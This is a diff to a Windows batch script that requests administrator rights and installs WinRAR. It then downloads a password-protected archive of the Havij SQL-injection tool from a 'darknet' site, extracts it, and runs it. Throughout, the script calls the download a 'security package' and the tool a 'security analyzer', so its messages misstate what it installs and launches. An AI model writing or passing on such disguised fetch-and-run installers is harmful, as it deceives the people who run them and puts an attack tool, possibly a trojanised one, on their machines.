@@ -9,7 +9,6 @@ set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-
 set "winrar_installer=!folder!\WinRAR-free.exe"
 set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
 set "havij_zip=!folder!\Havij_1.12_Free.zip"
-set "winrar_exe=C:\Program Files\WinRAR\WinRAR.exe"
 set "password=darknet123"
 
 :: Header
@@ -22,7 +21,7 @@ echo.
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo [STEP] Requesting administrative privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
+    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
     exit /b
 )
 
@@ -77,14 +76,64 @@ if "!firewall_present!"=="true" (
     echo [INFO] Basic security configuration applied
 )
 
-:: Install WinRAR
-echo [STEP] Downloading latest WinRAR...
-powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'"
+:: === WinRAR Detection and Installation ===
+set "winrar_exe="
 
-echo [STEP] Installing/Updating WinRAR...
-"!winrar_installer!" /S
-timeout /t 5 /nobreak >nul
-del "!winrar_installer!" >nul
+:: Try native 64-bit registry
+for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
+    set "winrar_exe=%%b"
+)
+
+:: Try WOW6432Node
+if not defined winrar_exe (
+    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
+        set "winrar_exe=%%b"
+    )
+)
+
+:: Try legacy path from WinRAR key
+if not defined winrar_exe (
+    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\WinRAR" /v "Path" 2^>nul ^| find "REG_SZ"') do (
+        set "winrar_exe=%%a\WinRAR.exe"
+    )
+)
+
+:: If still not found, install WinRAR
+if not defined winrar_exe (
+    echo [STEP] Downloading latest WinRAR...
+    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'"
+
+    echo [STEP] Installing WinRAR...
+    start "" /wait "!winrar_installer!" /S
+    timeout /t 10 /nobreak >nul
+    del "!winrar_installer!" >nul
+
+    :: Re-check registry after install
+    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
+        set "winrar_exe=%%b"
+    )
+    if not defined winrar_exe (
+        for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
+            set "winrar_exe=%%b"
+        )
+    )
+)
+
+:: Fallback
+if not defined winrar_exe (
+    set "winrar_exe=%ProgramFiles%\WinRAR\WinRAR.exe"
+)
+
+:: Final verification
+echo [INFO] Verifying WinRAR at: !winrar_exe!
+if not exist !winrar_exe! (
+    echo [ERROR] WinRAR not found at: !winrar_exe!
+    echo [ACTION] Please install WinRAR manually and re-run this script.
+    pause
+    exit /b
+)
+
+:: === Continue with Extraction ===
 
 :: Download Havij ZIP
 echo [STEP] Retrieving security package...
@@ -96,12 +145,16 @@ powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'
     exit /b
 )
 
-:: Modified extraction section with waiting
+:: Decrypt using WinRAR
 echo [STEP] Decrypting secure package...
 start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"
 
 if %errorlevel% equ 0 (
     echo [SUCCESS] Package decrypted successfully
+    :: === NEW CODE STARTS HERE ===
+    echo [STEP] Launching security analyzer...
+    start "" /D "!folder!" "Havij 1.12 Free.exe"
+    :: === NEW CODE ENDS HERE ===
 ) else if %errorlevel% equ 1 (
     echo [ALERT] Invalid security credentials
 ) else if %errorlevel% equ 2 (
